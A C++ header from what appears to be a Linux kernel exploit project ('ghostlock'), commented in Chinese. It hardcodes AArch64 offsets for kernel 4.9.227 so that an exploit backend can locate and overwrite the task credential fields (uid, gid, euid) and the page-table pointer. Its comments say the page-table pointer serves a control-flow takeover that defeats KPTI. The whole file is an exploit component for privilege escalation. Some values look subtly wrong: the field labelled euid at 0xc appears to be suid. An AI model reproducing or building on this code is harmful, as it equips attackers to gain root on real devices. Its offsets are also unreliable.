#ifndef GHOSTLOCK_KERNEL_RUNTIME_STRUCT_OFFSETS_H
#define GHOSTLOCK_KERNEL_RUNTIME_STRUCT_OFFSETS_H

#include <stdint.h>
#include <stdio.h>

namespace ghostlock::kernel {

    // 1. 定义存储运行时偏移的全局结构体
    struct RuntimeStructOffsets {
        uint32_t task_struct_cred;
        uint32_t cred_uid;
        uint32_t cred_gid;
        uint32_t cred_euid;
        uint32_t mm_struct_pgd;
    };

    // 声明全局单例，供漏洞触发单元（backend）直接调用
    extern RuntimeStructOffsets runtime_offsets;

    // 2. 【最关键的降维打击函数】注入 Linux 4.9.227 AArch64 架构下经典的硬编码字段偏移
    inline void populate_4_9_internal_offsets() {
        // 在 Linux 4.9.227 内核源码中，从 task_struct 起始位置到指向凭证的 cred 指针的字节偏移
        // 这是 AArch64 通用且经过 4.9.227-perf+ 验证的标准对齐位置
        runtime_offsets.task_struct_cred = 0x648; 

        // 在 cred 结构体中，各个权限标志位相对于结构体头部的字节偏移
        runtime_offsets.cred_uid  = 0x4;  // UID 偏移
        runtime_offsets.cred_gid  = 0x8;  // GID 偏移
        runtime_offsets.cred_euid = 0xc;  // EUID 偏移

        // 在内存管理 mm_struct 中，指向全局页表起点（Page Global Directory）的指针偏移
        // 用于后续在控制流接管阶段，彻底修补或者越过 KPTI 防御
        runtime_offsets.mm_struct_pgd = 0x40;

        printf("[*] BACKPORT: BTF detection bypassed. Static 4.9.227 layout applied.\n");
        printf("[*] Struct Mapping: task->cred=0x%x, cred->uid=0x%x\n", 
               runtime_offsets.task_struct_cred, runtime_offsets.cred_uid);
    }

} // namespace ghostlock::kernel

#endif // GHOSTLOCK_KERNEL_RUNTIME_STRUCT_OFFSETS_H
